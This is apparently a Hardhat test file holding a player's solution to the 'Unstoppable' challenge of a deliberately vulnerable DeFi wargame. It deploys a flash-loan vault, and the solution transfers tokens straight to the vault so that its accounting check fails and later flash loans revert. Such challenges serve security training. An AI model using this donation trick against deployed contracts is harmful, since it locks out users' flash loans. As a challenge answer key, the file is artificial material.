const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require('@nomicfoundation/hardhat-network-helpers');

describe('[Challenge] Unstoppable', function () {
    let deployer, player, someUser;
    let token, vault, receiverContract;

    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, player, someUser] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        vault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(
            token.address,
            deployer.address, // owner
            deployer.address // fee recipient
        );
        expect(await vault.asset()).to.eq(token.address);

        await token.approve(vault.address, TOKENS_IN_VAULT);
        await vault.deposit(TOKENS_IN_VAULT, deployer.address);

        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
        expect(
            await vault.flashFee(token.address, TOKENS_IN_VAULT)
        ).to.eq(50000n * 10n ** 18n);

        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
            vault.address
        );
        await receiverContract.executeFlashLoan(100n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Dump some information to get an idea of what is going on
        // This code is not necessary for the solution
        //=============================================================
        // Asset Token info
        let totalSupply = await token.totalSupply();
        let playerBalance = await token.balanceOf(player.address);
        let vaultAssets = await vault.totalAssets();
        console.log("Token Total Supply:   ", totalSupply);
        console.log("Token Player Balance: ", playerBalance);
        console.log("Token Vault Balance:  ", vaultAssets);

        // Share token info
        let vaultSupply = await vault.totalSupply();
        console.log("Share total supply:   ", vaultSupply);

        let maxLoan = vault.maxFlashLoan(token.address);
        let feeSmallLoan = await vault.flashFee(token.address, 1000n);
        console.log("Max Loan:       ", maxLoan);
        console.log("Small Loan Fee: ", feeSmallLoan);

        // If you try to loan out the max fee, the fee kicks in.
        let feeBigLoan = await vault.flashFee(token.address, maxLoan);
        console.log("Small Loan Fee: ", feeBigLoan);
        //=============================================================

        // Solution
        //=============================================================
        let playerBalance2 = await token.balanceOf(player.address);
        await token.connect(player).transfer(vault.address, playerBalance2);
        //=============================================================
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        await expect(
            receiverContract.executeFlashLoan(100n * 10n ** 18n)
        ).to.be.reverted;
    });
});
